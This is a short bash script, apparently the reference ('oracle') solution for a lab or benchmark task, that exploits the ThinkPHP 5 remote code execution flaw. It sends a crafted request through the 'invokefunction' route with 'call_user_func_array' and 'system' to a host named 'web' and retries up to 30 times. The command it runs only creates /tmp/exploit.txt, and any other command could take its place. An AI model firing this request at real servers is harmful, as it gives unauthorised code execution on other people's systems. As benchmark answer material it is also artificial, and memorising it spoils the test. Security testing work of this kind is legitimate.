#!/usr/bin/env bash
set -euo pipefail

# Wait for Apache/PHP to initialize
sleep 5

exploit_once() {
  local base='http://web:80'
  
  # Direct RCE via controller name manipulation (URL-encode square brackets)
  curl -sS --max-time 60 -X GET "${base}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=touch%20/tmp/exploit.txt" \
    >/dev/null || return 1
}

for _ in $(seq 1 30); do
  if exploit_once; then 
    sleep 2
    exit 0
  fi
  sleep 3
done

echo 'oracle_solution: thinkphp 5-rce exploit failed' >&2
exit 1
